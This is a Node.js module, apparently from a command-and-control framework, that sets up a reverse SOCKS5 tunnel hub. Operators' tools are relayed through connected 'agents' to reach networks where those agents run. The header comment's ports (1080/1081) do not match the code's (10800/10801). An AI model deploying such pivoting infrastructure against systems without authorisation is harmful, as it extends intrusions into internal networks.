const net = require('net');

/**
 * SOCKS Manager handles reverse SOCKS5 tunneling.
 * Operator (Browser/Proxychains) -> Port 1080 (SOCKS5 Server)
 * Agent (Reverse Tunnel) -> Port 1081 (Tunnel Hub)
 */

class SocksManager {
  constructor() {
    this.agentSockets = new Map(); // agentId -> socket
    this.operatorServer = null;
    this.agentHubServer = null;
  }

  initialize() {
    // 1. Agent Hub - Listens for reverse connections from agents
    this.agentHubServer = net.createServer((socket) => {
      console.log('[SOCKS] Agent connected to reverse tunnel hub');
      
      socket.once('data', (data) => {
        const line = data.toString().trim();
        if (line.startsWith('AGENT_ID:')) {
          const agentId = line.split(':')[1];
          this.agentSockets.set(agentId, socket);
          console.log(`[SOCKS] Registered reverse tunnel for agent: ${agentId}`);
          
          socket.on('close', () => {
            this.agentSockets.delete(agentId);
            console.log(`[SOCKS] Agent ${agentId} tunnel closed`);
          });
          
          socket.on('error', (err) => {
            console.error(`[SOCKS] Tunnel error for ${agentId}:`, err.message);
          });
        }
      });
    });

    this.agentHubServer.listen(10801, () => {
      console.log('[SOCKS] Reverse Tunnel Hub listening on port 10801');
    });


    // 2. Operator Server - SOCKS5 server for the operator's tools
    this.operatorServer = net.createServer((socket) => {
      console.log('[SOCKS] Operator tool connected to SOCKS5 interface');
      
      // Simple SOCKS5 Handshake
      socket.once('data', (data) => {
        if (data[0] !== 0x05) {
          console.log('[SOCKS] Invalid SOCKS version');
          socket.destroy();
          return;
        }

        // Auth response (No auth)
        socket.write(Buffer.from([0x05, 0x00]));

        // Request handling
        socket.once('data', (request) => {
          const cmd = request[1];
          if (cmd !== 0x01) { // CONNECT
            socket.destroy();
            return;
          }

          // We need an agent to tunnel through
          // In this tactical version, we'll use the most recently connected agent
          const agentId = Array.from(this.agentSockets.keys()).pop();
          if (!agentId) {
            console.log('[SOCKS] No active agents for tunneling');
            socket.write(Buffer.from([0x05, 0x03, 0x00, 0x01, 0, 0, 0, 0, 0, 0])); // Host unreachable
            socket.destroy();
            return;
          }

          const agentSocket = this.agentSockets.get(agentId);
          console.log(`[SOCKS] Tunneling operator request through agent: ${agentId}`);

          // Send the raw SOCKS5 request to the agent
          agentSocket.write(request);

          // Relay data
          socket.pipe(agentSocket);
          agentSocket.pipe(socket);
        });
      });
    });

    this.operatorServer.listen(10800, () => {
      console.log('[SOCKS] Operator SOCKS5 Interface listening on port 10800');
    });

  }
}

module.exports = new SocksManager();
